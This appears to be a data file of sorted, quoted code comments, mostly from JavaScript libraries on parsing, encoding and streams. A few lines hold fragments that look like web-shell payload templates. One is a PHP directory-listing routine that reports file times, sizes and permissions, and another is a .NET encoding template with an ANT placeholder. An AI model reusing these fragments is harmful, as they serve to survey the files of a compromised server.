"// On windows, thanks to the magic of 8.3 shortnames, it is fundamentally"
"// Once again, Sass deviates from the spec and supplies the version as a"
"// Only 2 items were set using localForage,"
"// Only String really seems appropriate here, since BigInt values"
"// Only add window if we got to document (e.g., not plain obj or detached DOM)"
"// Only placeholder, since it will be rescanned as a real assignment expression."
"// Only use tocbot for main docs, not test docs"
"// Opera 10.63+ [xxx = 0, xXx = 2]"
"// Optimization, not in the spec."
"// Optimize for push.apply( _, NodeList )"
"// Optional AJAX dependency, but won't run scripts if not present"
"// Optional dependency (as in, doesn't need to be installed, NOT like optionalDependencies in package.json)"
"// Or specify/override options when you instantiate, if you prefer:"
"// Or use `pfx` property replacing `cert` and `key` when using private key, certificate and CA certs in PFX or PKCS12 format:"
"// Or, with named functions:"
"// Original file position, but no source."
"// Other errors are warnings, which raise the error in strict"
"// Otherwise (e.g. `<input type=""text"">`, return only one key/value pair"
"// Otherwise bring back whatever was previously saved (if anything),"
"// Otherwise err on the side of overparenthesization, adding"
"// Otherwise people can pipe Writable streams, which is just wrong."
"// Otherwise secure it in a non-enumerable, non-writable property"
"// Otherwise stream chunks are all considered to be of length=1, and the"
"// Otherwise, ask the cursor to skip ahead n"
"// Otherwise, avoid the DOM node creation, insertion"
"// Otherwise, build a param string"
"// Otherwise, create an array by matching non-whitespace"
"// Otherwise, do not use tunnel."
"// Otherwise, do nothing"
"// Otherwise, double quotes are used."
"// Otherwise, if a way to get the computed value exists, use that"
"// Otherwise, insert the intermediate dataType"
"// Otherwise, redefine all properties (slow!)"
"// Otherwise, set the pointerBeforeReferenceNode attribute to false."
"// Otherwise, simply generate a flat `switch` statement."
"// Otherwise, this object is spent"
"// Otherwise, this returns the code unit of the index (can be a part of a surrogate pair)."
"// Otherwise, throw an Invalid Package Target error."
"// Otherwise, throw an error or return tokens"
"// Otherwise, use our decoding method."
"// Otherwise, use our encoding method."
"// Otherwise, we return either a specified config value or all"
"// Our codec supports UTF-16 surrogates, extensions for GB18030 and unicode sequences."
"// Out: [1, 2, 3]"
"// Out: x = {""class"": 2};"
"// Out: x[""class""] = 3;"
"// Output: a string that contains all alphabetic letters, high-byte characters, and word immediately preceding `>`, but nothing else within `<>`"
"// Override this option to use a different line terminator, e.g. \r\n."
"// Own properties are enumerated firstly, so to speed up,"
"// Owner will be preserved, unless ref is overridden"
"// P:String=System.Text.Encoding.GetEncoding(""!{ANT::ENDOCE}"").GetString(System.C"
"// PACKAGE_EXPORTS_RESOLVE(packageURL, subpath, exports, conditions)"
"// PACKAGE_IMPORTS_EXPORTS_RESOLVE(matchKey, matchObj, packageURL, isImports, conditions)"
"// PACKAGE_IMPORTS_RESOLVE(specifier, parentURL, conditions)"
"// PACKAGE_RESOLVE(packageSpecifier, parentURL)"
"// PACKAGE_TARGET_RESOLVE(packageURL, target, subpath, pattern, internal, conditions)"
"// PATTERN_KEY_COMPARE(keyA, keyB)"
"// Pack sign, exponent, fraction"
"// Padding ""String"""
"// Parse a `for`/`in` and `for`/`of` loop, which are almost"
"// Parse a program. Initializes the parser, reads any number of"
"// Parse a regular expression. Some context-awareness is necessary,"
"// Parse a semicolon-enclosed block of statements, handling `""use"
"// Parse call, dot, and `[]`-subscript expressions."
"// Parse headers and setup the parser, ready to start listening for data."
"// Parse the code using an interface similar to require(""esprima"").parse."
"// Parse unary operators, both prefix and postfix."
"// Parsers aren't required to observe error event,"
"// Parses a comma-separated list of expressions, and returns them as"
"// Part of an app, that fetches cats of the logged user."
"// Pass a string as options.sourceMapName to recast.print, and"
"// Pass bytes on through for single-byte encodings (e.g. ascii, latin1, hex)"
"// Pass optional meta-data with an 'options' object with style: {value: DATA, options: OPTIONS}"
"// Passed in values `a`, `b`, `c`"
"// Passed in values `x`, `z`"
"// Passing a regex object to copy it. The copy maintains special properties for named capture,"
"// Patch fs.close/closeSync to shared queue version, because we need"
"// Path Not Found Or No Permission!"");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.$N;$T=@date(""Y-m-d H:i:s"",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=""\\t"".$T.""\\t"".@filesize($P).""\\t"".$E.""\\n"";if(@is_dir($P))$M.=$N.""/"".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}`,"
"// Path Not Found Or No Permission!"");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.$N;$T=@date(""Y-m-d H:i:s"",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=""\t"".$T.""\t"".@filesize($P).""\t"".$E.""\n"";if(@is_dir($P))$M.=$N.""/"".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}`,"
"// Path not found OR no Permission"";`"
"// People use this property instead all the time, so support it"
"// Per 4.2.1.2, Bump clockseq on clock regression"
"// Per 4.2.1.2, use count of uuid's generated during the current clock"
"// Per 4.2.2, randomize (14 bit) clockseq"
"// Per 4.4, set bits for version and `clock_seq_hi_and_reserved`"
"// Per 4.5, create and 48-bit node id, (47 random bits + multicast bit = 1)"
"// Person {name: 'Laura', age: 25}"
"// Plus sign, followed by one or more period-separated build metadata"
"// Pop the previous token, '/' or '/='"
"// Pop the previous token, which is likely '/' or '/='"
"// Populate the exported fields of the namedTypes namespace, while still"
"// Pre-defined namespaces, per Appendix C"
"// Precompiled matchers will still verify ancestry, so step up a level"
"// Prefer `hostname` over `host`, and set the `port` if needed."
"// Prefer `hostname` over `host`, because of `url.parse()`"
"// Prefilter to get matcher input, preserving a map for seed-results synchronization"
"// Preparing all the $in arrays, will take some time"
"// Prevent attribute/property ""interpolation"""
